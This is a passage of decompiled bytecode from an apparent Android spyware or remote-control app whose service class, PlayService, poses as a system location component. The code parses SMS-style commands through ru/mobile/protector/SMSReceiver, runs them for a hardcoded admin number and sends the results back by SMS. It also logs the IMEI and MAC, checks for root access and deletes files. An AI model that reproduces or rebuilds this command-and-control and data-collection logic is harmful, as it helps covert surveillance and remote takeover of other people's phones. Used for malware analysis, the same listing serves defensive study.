    //   7627: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7630: aload 14
    //   7632: astore 18
    //   7634: aload 14
    //   7636: astore 19
    //   7638: aload 14
    //   7640: astore 16
    //   7642: aload 14
    //   7644: astore 20
    //   7646: aload 14
    //   7648: astore 17
    //   7650: aload 14
    //   7652: astore 13
    //   7654: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   7657: goto +1697 -> 9354
    //   7660: aload 14
    //   7662: astore 18
    //   7664: aload 14
    //   7666: astore 19
    //   7668: aload 14
    //   7670: astore 16
    //   7672: aload 14
    //   7674: astore 20
    //   7676: aload 14
    //   7678: astore 17
    //   7680: aload 14
    //   7682: astore 13
    //   7684: new 864	java/lang/StringBuilder
    //   7687: dup
    //   7688: ldc_w 5891
    //   7691: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7694: getstatic 773	com/android/location/PlayService:SMSServer	Ljava/lang/String;
    //   7697: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7700: aload 22
    //   7702: iconst_4
    //   7703: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   7706: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7709: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7712: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7715: aload 14
    //   7717: astore 18
    //   7719: aload 14
    //   7721: astore 19
    //   7723: aload 14
    //   7725: astore 16
    //   7727: aload 14
    //   7729: astore 20
    //   7731: aload 14
    //   7733: astore 17
    //   7735: aload 14
    //   7737: astore 13
    //   7739: getstatic 721	com/android/location/PlayService:iDaysLeft	J
    //   7742: lconst_0
    //   7743: lcmp
    //   7744: ifle +131 -> 7875
    //   7747: aload 14
    //   7749: astore 18
    //   7751: aload 14
    //   7753: astore 19
    //   7755: aload 14
    //   7757: astore 16
    //   7759: aload 14
    //   7761: astore 20
    //   7763: aload 14
    //   7765: astore 17
    //   7767: aload 14
    //   7769: astore 13
    //   7771: getstatic 773	com/android/location/PlayService:SMSServer	Ljava/lang/String;
    //   7774: invokevirtual 1649	java/lang/String:length	()I
    //   7777: iconst_4
    //   7778: if_icmple +97 -> 7875
    //   7781: aload 14
    //   7783: astore 18
    //   7785: aload 14
    //   7787: astore 19
    //   7789: aload 14
    //   7791: astore 16
    //   7793: aload 14
    //   7795: astore 20
    //   7797: aload 14
    //   7799: astore 17
    //   7801: aload 14
    //   7803: astore 13
    //   7805: getstatic 1520	android/os/Build$VERSION:SDK_INT	I
    //   7808: bipush 19
    //   7810: if_icmpge +65 -> 7875
    //   7813: aload 14
    //   7815: astore 18
    //   7817: aload 14
    //   7819: astore 19
    //   7821: aload 14
    //   7823: astore 16
    //   7825: aload 14
    //   7827: astore 20
    //   7829: aload 14
    //   7831: astore 17
    //   7833: aload 14
    //   7835: astore 13
    //   7837: aload_0
    //   7838: getstatic 787	com/android/location/PlayService:sAdminNumber	Ljava/lang/String;
    //   7841: new 864	java/lang/StringBuilder
    //   7844: dup
    //   7845: ldc_w 1329
    //   7848: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   7851: getstatic 773	com/android/location/PlayService:SMSServer	Ljava/lang/String;
    //   7854: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7857: aload 22
    //   7859: iconst_4
    //   7860: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   7863: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   7866: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   7869: invokevirtual 5896	com/android/location/PlayService:SendSMS	(Ljava/lang/String;Ljava/lang/String;)V
    //   7872: goto -367 -> 7505
    //   7875: aload 14
    //   7877: astore 18
    //   7879: aload 14
    //   7881: astore 19
    //   7883: aload 14
    //   7885: astore 16
    //   7887: aload 14
    //   7889: astore 20
    //   7891: aload 14
    //   7893: astore 17
    //   7895: aload 14
    //   7897: astore 13
    //   7899: ldc_w 5902
    //   7902: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   7905: goto -400 -> 7505
    //   7908: aload 14
    //   7910: astore 18
    //   7912: aload 14
    //   7914: astore 19
    //   7916: aload 14
    //   7918: astore 16
    //   7920: aload 14
    //   7922: astore 20
    //   7924: aload 14
    //   7926: astore 17
    //   7928: aload 14
    //   7930: astore 13
    //   7932: aload 22
    //   7934: ldc_w 5904
    //   7937: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   7940: ifeq +939 -> 8879
    //   7943: aload 14
    //   7945: astore 18
    //   7947: aload 14
    //   7949: astore 19
    //   7951: aload 14
    //   7953: astore 16
    //   7955: aload 14
    //   7957: astore 20
    //   7959: aload 14
    //   7961: astore 17
    //   7963: aload 14
    //   7965: astore 13
    //   7967: aload 22
    //   7969: bipush 6
    //   7971: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   7974: ldc_w 5906
    //   7977: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   7980: ifne +787 -> 8767
    //   7983: aload 14
    //   7985: astore 18
    //   7987: aload 14
    //   7989: astore 19
    //   7991: aload 14
    //   7993: astore 16
    //   7995: aload 14
    //   7997: astore 20
    //   7999: aload 14
    //   8001: astore 17
    //   8003: aload 14
    //   8005: astore 13
    //   8007: aload 22
    //   8009: bipush 6
    //   8011: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   8014: astore 23
    //   8016: aload 14
    //   8018: astore 18
    //   8020: aload 14
    //   8022: astore 19
    //   8024: aload 14
    //   8026: astore 16
    //   8028: aload 14
    //   8030: astore 20
    //   8032: aload 14
    //   8034: astore 17
    //   8036: aload 14
    //   8038: astore 13
    //   8040: new 864	java/lang/StringBuilder
    //   8043: dup
    //   8044: ldc_w 5908
    //   8047: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8050: aload 22
    //   8052: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8055: ldc_w 2141
    //   8058: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8061: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8064: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8067: aload 14
    //   8069: astore 18
    //   8071: aload 14
    //   8073: astore 19
    //   8075: aload 14
    //   8077: astore 16
    //   8079: aload 14
    //   8081: astore 20
    //   8083: aload 14
    //   8085: astore 17
    //   8087: aload 14
    //   8089: astore 13
    //   8091: aload 23
    //   8093: ldc_w 5910
    //   8096: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   8099: iconst_m1
    //   8100: if_icmpgt +39 -> 8139
    //   8103: aload 14
    //   8105: astore 18
    //   8107: aload 14
    //   8109: astore 19
    //   8111: aload 14
    //   8113: astore 16
    //   8115: aload 14
    //   8117: astore 20
    //   8119: aload 14
    //   8121: astore 17
    //   8123: aload 14
    //   8125: astore 13
    //   8127: aload 23
    //   8129: ldc_w 5912
    //   8132: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   8135: iconst_m1
    //   8136: if_icmple +107 -> 8243
    //   8139: aload 14
    //   8141: astore 18
    //   8143: aload 14
    //   8145: astore 19
    //   8147: aload 14
    //   8149: astore 16
    //   8151: aload 14
    //   8153: astore 20
    //   8155: aload 14
    //   8157: astore 17
    //   8159: aload 14
    //   8161: astore 13
    //   8163: bipush 23
    //   8165: ldc_w 571
    //   8168: getstatic 787	com/android/location/PlayService:sAdminNumber	Ljava/lang/String;
    //   8171: iconst_0
    //   8172: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   8175: invokestatic 5916	ru/mobile/protector/SMSReceiver:CommandProcess	(ILjava/lang/String;Ljava/lang/String;ZLandroid/content/Context;)Ljava/lang/String;
    //   8178: astore 23
    //   8180: aload 14
    //   8182: astore 18
    //   8184: aload 14
    //   8186: astore 19
    //   8188: aload 14
    //   8190: astore 16
    //   8192: aload 14
    //   8194: astore 20
    //   8196: aload 14
    //   8198: astore 17
    //   8200: aload 14
    //   8202: astore 13
    //   8204: new 864	java/lang/StringBuilder
    //   8207: dup
    //   8208: getstatic 843	com/android/location/PlayService:sWEBLOG	Ljava/lang/String;
    //   8211: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   8214: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8217: ldc_w 5918
    //   8220: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8223: aload 23
    //   8225: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8228: ldc_w 5920
    //   8231: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8234: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8237: putstatic 843	com/android/location/PlayService:sWEBLOG	Ljava/lang/String;
    //   8240: goto -735 -> 7505
    //   8243: iconst_4
    //   8244: istore 5
    //   8246: aload 14
    //   8248: astore 18
    //   8250: aload 14
    //   8252: astore 19
    //   8254: aload 14
    //   8256: astore 16
    //   8258: aload 14
    //   8260: astore 20
    //   8262: aload 14
    //   8264: astore 17
    //   8266: aload 14
    //   8268: astore 13
    //   8270: aload 23
    //   8272: invokevirtual 1649	java/lang/String:length	()I
    //   8275: iconst_4
    //   8276: if_icmple +440 -> 8716
    //   8279: aload 14
    //   8281: astore 18
    //   8283: aload 14
    //   8285: astore 19
    //   8287: aload 14
    //   8289: astore 16
    //   8291: aload 14
    //   8293: astore 20
    //   8295: aload 14
    //   8297: astore 17
    //   8299: aload 14
    //   8301: astore 13
    //   8303: aload 23
    //   8305: iconst_4
    //   8306: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8309: bipush 42
    //   8311: if_icmpne +405 -> 8716
    //   8314: iconst_5
    //   8315: istore 5
    //   8317: aload 14
    //   8319: astore 18
    //   8321: aload 14
    //   8323: astore 19
    //   8325: aload 14
    //   8327: astore 16
    //   8329: aload 14
    //   8331: astore 20
    //   8333: aload 14
    //   8335: astore 17
    //   8337: aload 14
    //   8339: astore 13
    //   8341: new 864	java/lang/StringBuilder
    //   8344: dup
    //   8345: ldc_w 5926
    //   8348: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8351: iconst_5
    //   8352: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8355: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8358: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8361: aload 14
    //   8363: astore 18
    //   8365: aload 14
    //   8367: astore 19
    //   8369: aload 14
    //   8371: astore 16
    //   8373: aload 14
    //   8375: astore 20
    //   8377: aload 14
    //   8379: astore 17
    //   8381: aload 14
    //   8383: astore 13
    //   8385: new 864	java/lang/StringBuilder
    //   8388: dup
    //   8389: ldc_w 5928
    //   8392: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8395: aload 23
    //   8397: iconst_4
    //   8398: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8401: invokevirtual 5931	java/lang/StringBuilder:append	(C)Ljava/lang/StringBuilder;
    //   8404: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8407: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8410: aload 14
    //   8412: astore 18
    //   8414: aload 14
    //   8416: astore 19
    //   8418: aload 14
    //   8420: astore 16
    //   8422: aload 14
    //   8424: astore 20
    //   8426: aload 14
    //   8428: astore 17
    //   8430: aload 14
    //   8432: astore 13
    //   8434: aload 23
    //   8436: iconst_1
    //   8437: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8440: bipush 48
    //   8442: isub
    //   8443: bipush 100
    //   8445: imul
    //   8446: aload 23
    //   8448: iconst_2
    //   8449: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8452: bipush 48
    //   8454: isub
    //   8455: bipush 10
    //   8457: imul
    //   8458: iadd
    //   8459: aload 23
    //   8461: iconst_3
    //   8462: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8465: bipush 48
    //   8467: isub
    //   8468: iadd
    //   8469: istore 4
    //   8471: aload 14
    //   8473: astore 18
    //   8475: aload 14
    //   8477: astore 19
    //   8479: aload 14
    //   8481: astore 16
    //   8483: aload 14
    //   8485: astore 20
    //   8487: aload 14
    //   8489: astore 17
    //   8491: aload 14
    //   8493: astore 13
    //   8495: aload 23
    //   8497: iload 5
    //   8499: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   8502: invokevirtual 1652	java/lang/String:trim	()Ljava/lang/String;
    //   8505: astore 23
    //   8507: aload 14
    //   8509: astore 18
    //   8511: aload 14
    //   8513: astore 19
    //   8515: aload 14
    //   8517: astore 16
    //   8519: aload 14
    //   8521: astore 20
    //   8523: aload 14
    //   8525: astore 17
    //   8527: aload 14
    //   8529: astore 13
    //   8531: new 864	java/lang/StringBuilder
    //   8534: dup
    //   8535: ldc_w 5933
    //   8538: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8541: iload 4
    //   8543: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8546: ldc_w 5276
    //   8549: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8552: aload 23
    //   8554: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8557: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8560: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8563: aload 14
    //   8565: astore 18
    //   8567: aload 14
    //   8569: astore 19
    //   8571: aload 14
    //   8573: astore 16
    //   8575: aload 14
    //   8577: astore 20
    //   8579: aload 14
    //   8581: astore 17
    //   8583: aload 14
    //   8585: astore 13
    //   8587: iload 4
    //   8589: aload 23
    //   8591: getstatic 787	com/android/location/PlayService:sAdminNumber	Ljava/lang/String;
    //   8594: iconst_0
    //   8595: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   8598: invokestatic 5916	ru/mobile/protector/SMSReceiver:CommandProcess	(ILjava/lang/String;Ljava/lang/String;ZLandroid/content/Context;)Ljava/lang/String;
    //   8601: astore 23
    //   8603: aload 14
    //   8605: astore 18
    //   8607: aload 14
    //   8609: astore 19
    //   8611: aload 14
    //   8613: astore 16
    //   8615: aload 14
    //   8617: astore 20
    //   8619: aload 14
    //   8621: astore 17
    //   8623: aload 14
    //   8625: astore 13
    //   8627: new 864	java/lang/StringBuilder
    //   8630: dup
    //   8631: ldc_w 5935
    //   8634: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8637: aload 23
    //   8639: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8642: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8645: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8648: aload 14
    //   8650: astore 18
    //   8652: aload 14
    //   8654: astore 19
    //   8656: aload 14
    //   8658: astore 16
    //   8660: aload 14
    //   8662: astore 20
    //   8664: aload 14
    //   8666: astore 17
    //   8668: aload 14
    //   8670: astore 13
    //   8672: new 864	java/lang/StringBuilder
    //   8675: dup
    //   8676: getstatic 843	com/android/location/PlayService:sWEBLOG	Ljava/lang/String;
    //   8679: invokestatic 1310	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   8682: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8685: iload 4
    //   8687: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   8690: ldc_w 5937
    //   8693: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8696: aload 23
    //   8698: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8701: ldc_w 5920
    //   8704: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8707: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8710: putstatic 843	com/android/location/PlayService:sWEBLOG	Ljava/lang/String;
    //   8713: goto -1208 -> 7505
    //   8716: aload 14
    //   8718: astore 18
    //   8720: aload 14
    //   8722: astore 19
    //   8724: aload 14
    //   8726: astore 16
    //   8728: aload 14
    //   8730: astore 20
    //   8732: aload 14
    //   8734: astore 17
    //   8736: aload 14
    //   8738: astore 13
    //   8740: aload 23
    //   8742: iconst_1
    //   8743: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8746: bipush 48
    //   8748: isub
    //   8749: bipush 10
    //   8751: imul
    //   8752: aload 23
    //   8754: iconst_2
    //   8755: invokevirtual 5924	java/lang/String:charAt	(I)C
    //   8758: bipush 48
    //   8760: isub
    //   8761: iadd
    //   8762: istore 4
    //   8764: goto -293 -> 8471
    //   8767: aload 14
    //   8769: astore 18
    //   8771: aload 14
    //   8773: astore 19
    //   8775: aload 14
    //   8777: astore 16
    //   8779: aload 14
    //   8781: astore 20
    //   8783: aload 14
    //   8785: astore 17
    //   8787: aload 14
    //   8789: astore 13
    //   8791: new 864	java/lang/StringBuilder
    //   8794: dup
    //   8795: ldc_w 5939
    //   8798: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8801: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   8804: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8807: ldc_w 1530
    //   8810: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8813: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   8816: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8819: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8822: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8825: aload 14
    //   8827: astore 18
    //   8829: aload 14
    //   8831: astore 19
    //   8833: aload 14
    //   8835: astore 16
    //   8837: aload 14
    //   8839: astore 20
    //   8841: aload 14
    //   8843: astore 17
    //   8845: aload 14
    //   8847: astore 13
    //   8849: aload_0
    //   8850: getstatic 555	com/android/location/PlayService:res	Landroid/content/res/Resources;
    //   8853: ldc_w 5940
    //   8856: invokevirtual 1446	android/content/res/Resources:getString	(I)Ljava/lang/String;
    //   8859: iconst_0
    //   8860: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   8863: invokespecial 2675	com/android/location/PlayService:UpdateState	(Ljava/lang/String;ZB)V
    //   8866: aload 14
    //   8868: ifnull +8 -> 8876
    //   8871: aload 14
    //   8873: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   8876: bipush 9
    //   8878: ireturn
    //   8879: aload 14
    //   8881: astore 18
    //   8883: aload 14
    //   8885: astore 19
    //   8887: aload 14
    //   8889: astore 16
    //   8891: aload 14
    //   8893: astore 20
    //   8895: aload 14
    //   8897: astore 17
    //   8899: aload 14
    //   8901: astore 13
    //   8903: aload 22
    //   8905: ldc_w 5942
    //   8908: invokevirtual 1333	java/lang/String:startsWith	(Ljava/lang/String;)Z
    //   8911: ifeq -1406 -> 7505
    //   8914: aload 14
    //   8916: astore 18
    //   8918: aload 14
    //   8920: astore 19
    //   8922: aload 14
    //   8924: astore 16
    //   8926: aload 14
    //   8928: astore 20
    //   8930: aload 14
    //   8932: astore 17
    //   8934: aload 14
    //   8936: astore 13
    //   8938: aload 22
    //   8940: iconst_5
    //   8941: invokevirtual 2248	java/lang/String:substring	(I)Ljava/lang/String;
    //   8944: astore 23
    //   8946: aload 14
    //   8948: astore 18
    //   8950: aload 14
    //   8952: astore 19
    //   8954: aload 14
    //   8956: astore 16
    //   8958: aload 14
    //   8960: astore 20
    //   8962: aload 14
    //   8964: astore 17
    //   8966: aload 14
    //   8968: astore 13
    //   8970: new 864	java/lang/StringBuilder
    //   8973: dup
    //   8974: ldc_w 5944
    //   8977: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   8980: aload 23
    //   8982: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8985: ldc_w 2141
    //   8988: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   8991: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   8994: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   8997: aload 14
    //   8999: astore 18
    //   9001: aload 14
    //   9003: astore 19
    //   9005: aload 14
    //   9007: astore 16
    //   9009: aload 14
    //   9011: astore 20
    //   9013: aload 14
    //   9015: astore 17
    //   9017: aload 14
    //   9019: astore 13
    //   9021: aload 23
    //   9023: putstatic 839	com/android/location/PlayService:sLicense	Ljava/lang/String;
    //   9026: aload 14
    //   9028: astore 18
    //   9030: aload 14
    //   9032: astore 19
    //   9034: aload 14
    //   9036: astore 16
    //   9038: aload 14
    //   9040: astore 20
    //   9042: aload 14
    //   9044: astore 17
    //   9046: aload 14
    //   9048: astore 13
    //   9050: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   9053: goto -1548 -> 7505
    //   9056: aload 14
    //   9058: astore 18
    //   9060: aload 14
    //   9062: astore 19
    //   9064: aload 14
    //   9066: astore 16
    //   9068: aload 14
    //   9070: astore 20
    //   9072: aload 14
    //   9074: astore 17
    //   9076: aload 14
    //   9078: astore 13
    //   9080: iload 12
    //   9082: istore 11
    //   9084: aload 15
    //   9086: ldc_w 5946
    //   9089: invokevirtual 1581	java/lang/String:indexOf	(Ljava/lang/String;)I
    //   9092: iconst_m1
    //   9093: if_icmple -3384 -> 5709
    //   9096: aload 14
    //   9098: astore 18
    //   9100: aload 14
    //   9102: astore 19
    //   9104: aload 14
    //   9106: astore 16
    //   9108: aload 14
    //   9110: astore 20
    //   9112: aload 14
    //   9114: astore 17
    //   9116: aload 14
    //   9118: astore 13
    //   9120: ldc_w 5948
    //   9123: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   9126: aload 14
    //   9128: astore 18
    //   9130: aload 14
    //   9132: astore 19
    //   9134: aload 14
    //   9136: astore 16
    //   9138: aload 14
    //   9140: astore 20
    //   9142: aload 14
    //   9144: astore 17
    //   9146: aload 14
    //   9148: astore 13
    //   9150: new 1250	java/io/File
    //   9153: dup
    //   9154: new 864	java/lang/StringBuilder
    //   9157: dup
    //   9158: invokespecial 2166	java/lang/StringBuilder:<init>	()V
    //   9161: aload_0
    //   9162: invokevirtual 2170	com/android/location/PlayService:getFilesDir	()Ljava/io/File;
    //   9165: invokevirtual 1478	java/lang/StringBuilder:append	(Ljava/lang/Object;)Ljava/lang/StringBuilder;
    //   9168: ldc_w 1717
    //   9171: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   9174: ldc_w 4893
    //   9177: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   9180: iload_2
    //   9181: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   9184: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   9187: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   9190: astore 15
    //   9192: aload 14
    //   9194: astore 18
    //   9196: aload 14
    //   9198: astore 19
    //   9200: aload 14
    //   9202: astore 16
    //   9204: aload 14
    //   9206: astore 20
    //   9208: aload 14
    //   9210: astore 17
    //   9212: aload 14
    //   9214: astore 13
    //   9216: iload 12
    //   9218: istore 11
    //   9220: aload 15
    //   9222: invokevirtual 1257	java/io/File:exists	()Z
    //   9225: ifeq -3516 -> 5709
    //   9228: aload 14
    //   9230: astore 18
    //   9232: aload 14
    //   9234: astore 19
    //   9236: aload 14
    //   9238: astore 16
    //   9240: aload 14
    //   9242: astore 20
    //   9244: aload 14
    //   9246: astore 17
    //   9248: aload 14
    //   9250: astore 13
    //   9252: aload 15
    //   9254: invokevirtual 1281	java/io/File:delete	()Z
    //   9257: pop
    //   9258: iload 12
    //   9260: istore 11
    //   9262: goto -3553 -> 5709
    //   9265: astore_1
    //   9266: goto -8963 -> 303
    //   9269: astore_1
    //   9270: goto -8433 -> 837
    //   9273: astore 13
    //   9275: goto -6097 -> 3178
    //   9278: astore 13
    //   9280: goto -5350 -> 3930
    //   9283: astore_1
    //   9284: goto -5189 -> 4095
    //   9287: astore_1
    //   9288: goto -4583 -> 4705
    //   9291: astore_1
    //   9292: goto -416 -> 8876
    //   9295: astore_1
    //   9296: goto -8812 -> 484
    //   9299: astore_1
    //   9300: goto -7454 -> 1846
    //   9303: astore_1
    //   9304: goto -6951 -> 2353
    //   9307: astore_1
    //   9308: goto -6787 -> 2521
    //   9311: astore_1
    //   9312: goto -6678 -> 2634
    //   9315: astore 13
    //   9317: goto -6612 -> 2705
    //   9320: astore_1
    //   9321: goto -3463 -> 5858
    //   9324: astore 13
    //   9326: goto -6743 -> 2583
    //   9329: astore_1
    //   9330: goto -6849 -> 2481
    //   9333: astore 13
    //   9335: goto -7030 -> 2305
    //   9338: astore 13
    //   9340: goto -7542 -> 1798
    //   9343: astore_1
    //   9344: goto -8900 -> 444
    //   9347: iload_3
    //   9348: ifgt -3488 -> 5860
    //   9351: goto -4179 -> 5172
    //   9354: iload_3
    //   9355: iconst_1
    //   9356: iadd
    //   9357: istore_3
    //   9358: goto -3855 -> 5503
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	9361	0	this	PlayService
    //   0	9361	1	paramString	String
    //   0	9361	2	paramInt	int
    //   1532	7826	3	i	int
    //   1657	7106	4	j	int
    //   4	8494	5	k	int
    //   4395	328	6	m	int
    //   966	5913	7	l1	long
    //   6082	795	9	l2	long
    //   5665	3596	11	bool1	boolean
    //   20	9239	12	bool2	boolean
    //   62	9189	13	localObject1	Object
    //   9273	1	13	localException1	Exception
    //   9278	1	13	localException2	Exception
    //   9315	1	13	localException3	Exception
    //   9324	1	13	localException4	Exception
    //   9333	1	13	localException5	Exception
    //   9338	1	13	localException6	Exception
    //   29	9220	14	localObject2	Object
    //   23	9230	15	localObject3	Object
    //   50	9189	16	localObject4	Object
    //   58	9189	17	localObject5	Object
    //   42	9189	18	localObject6	Object
    //   46	9189	19	localObject7	Object
    //   54	9189	20	localObject8	Object
    //   32	7282	21	localObject9	Object
    //   35	8904	22	str1	String
    //   26	8996	23	str2	String
    //   38	269	24	localObject10	Object
    //   11	7139	25	localByteBuffer	ByteBuffer
    //   135	105	26	str3	String
    // Exception table:
    //   from	to	target	type
    //   64	84	419	java/net/ConnectException
    //   108	137	419	java/net/ConnectException
    //   161	176	419	java/net/ConnectException
    //   200	205	419	java/net/ConnectException
    //   229	250	419	java/net/ConnectException
    //   274	291	419	java/net/ConnectException
    //   330	337	419	java/net/ConnectException
    //   366	387	419	java/net/ConnectException
    //   411	419	419	java/net/ConnectException
    //   511	535	419	java/net/ConnectException
    //   559	568	419	java/net/ConnectException
    //   592	601	419	java/net/ConnectException
    //   625	637	419	java/net/ConnectException
    //   661	667	419	java/net/ConnectException
    //   691	695	419	java/net/ConnectException
    //   719	728	419	java/net/ConnectException
    //   752	761	419	java/net/ConnectException
    //   785	797	419	java/net/ConnectException
    //   821	827	419	java/net/ConnectException
    //   863	897	419	java/net/ConnectException
    //   921	939	419	java/net/ConnectException
    //   963	968	419	java/net/ConnectException
    //   992	999	419	java/net/ConnectException
    //   1023	1033	419	java/net/ConnectException
    //   1057	1064	419	java/net/ConnectException
    //   1088	1094	419	java/net/ConnectException
    //   1118	1125	419	java/net/ConnectException
    //   1149	1154	419	java/net/ConnectException
    //   1178	1184	419	java/net/ConnectException
    //   1208	1215	419	java/net/ConnectException
    //   1239	1245	419	java/net/ConnectException
    //   1269	1275	419	java/net/ConnectException
    //   1299	1308	419	java/net/ConnectException
    //   1332	1346	419	java/net/ConnectException
    //   1370	1380	419	java/net/ConnectException
    //   1404	1411	419	java/net/ConnectException
    //   1435	1456	419	java/net/ConnectException
    //   1480	1503	419	java/net/ConnectException
    //   1527	1533	419	java/net/ConnectException
    //   1557	1587	419	java/net/ConnectException
    //   1611	1617	419	java/net/ConnectException
    //   1641	1659	419	java/net/ConnectException
    //   1683	1704	419	java/net/ConnectException
    //   1733	1739	419	java/net/ConnectException
    //   1763	1771	419	java/net/ConnectException
    //   1872	1878	419	java/net/ConnectException
    //   1902	1911	419	java/net/ConnectException
    //   1935	1956	419	java/net/ConnectException
    //   1980	1990	419	java/net/ConnectException
    //   2014	2020	419	java/net/ConnectException
    //   2044	2054	419	java/net/ConnectException
